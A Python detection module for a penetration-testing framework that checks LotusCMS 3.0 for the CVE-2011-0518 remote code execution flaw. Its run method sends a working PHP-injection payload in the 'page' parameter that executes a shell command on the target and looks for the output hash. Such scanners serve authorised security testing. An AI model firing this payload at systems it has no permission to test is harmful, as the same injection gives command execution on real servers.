#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LotusCMS 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LotusCMS 3.0 - Remote Code Execution Detection',
        'description': "LotusCMS 3.0 is susceptible to remote code execution via the Router () function. This is done by embedding PHP code in the 'page' parameter, which will be passed to a eval call and allow remote code execution.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'lotuscms', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Hood3dRob1n/LotusCMS-Exploit',
            'https://nvd.nist.gov/vuln/detail/CVE-2011-0518',
        ],
        'cve': 'CVE-2011-0518',
    }

    def run(self):
        for path in ('/index.php', '/lcms/index.php'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="page=index');${system('echo lotuscms_rce | md5sum')};#\n")
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('38ee63071a04dc5e04ed22624c38e648',)
            if any(m in body for m in body_any):
                self.set_info(
                    severity='critical',
                    reason='LotusCMS 3.0 - Remote Code Execution detected',
                    path=path,
                )
                return True
        return False

